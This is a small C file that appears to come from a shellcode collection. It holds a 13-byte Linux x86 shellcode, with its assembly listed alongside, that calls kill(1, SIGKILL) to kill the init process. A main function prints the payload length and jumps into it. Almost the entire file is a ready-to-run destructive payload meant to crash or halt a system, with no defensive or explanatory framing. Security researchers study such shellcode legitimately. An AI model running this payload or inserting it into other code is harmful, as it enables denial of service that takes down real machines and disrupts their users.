/*
kill(1, SIGKILL) linux x86 (13 bytes)
Author MMxM (@hc0d3r)
Qui Mai  7 22:21:41 BRT 2015
*/

#include <stdio.h>
#include <string.h>

unsigned const char sc[] =
	"\x31\xc0"	//xor    %eax,%eax
	"\x31\xdb"	//xor    %ebx,%ebx
	"\x31\xc9"	//xor    %ecx,%ecx
	"\x43"		//inc    %ebx
	"\xb0\x25"	//mov    $0x25,%al
	"\xb1\x09"	//mov    $0x9,%cl
	"\xcd\x80"	//int    $0x80
;

int main(void){
	printf("Shellcode lenght: %d\n", strlen(sc));
	__asm__ ("jmp sc");
	return 0;
}

